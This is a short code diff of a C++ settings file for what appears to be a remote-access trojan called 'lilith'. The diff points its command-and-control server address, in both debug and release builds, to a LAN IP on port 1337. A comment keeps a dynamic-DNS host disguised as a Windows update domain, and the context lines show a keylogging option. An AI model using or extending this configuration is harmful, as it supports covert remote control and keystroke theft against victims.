@@ -1,7 +1,7 @@
 #include "settings.h"
 
 #if _DEBUG
-std::string Settings::serverIP = "127.0.0.1";		//server ip
+std::string Settings::serverIP = "192.168.231.133";		//server ip
 int Settings::serverPort = 1337;	//server port
 
 std::string Settings::fileName = "lilithDEBUG.exe";					//file name
@@ -19,7 +19,7 @@ bool Settings::logKeys = false;	//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//speci
 
 #else
 
-std::string Settings::serverIP = "sample.ip.net";	/*windistupdate.ddns.net*/	//server ip
+std::string Settings::serverIP = "192.168.231.133";	/*windistupdate.ddns.net*/	//server ip
 int Settings::serverPort = 1337;	//server port
 
 std::string Settings::fileName = "lilithRELEASE.exe";					//file name
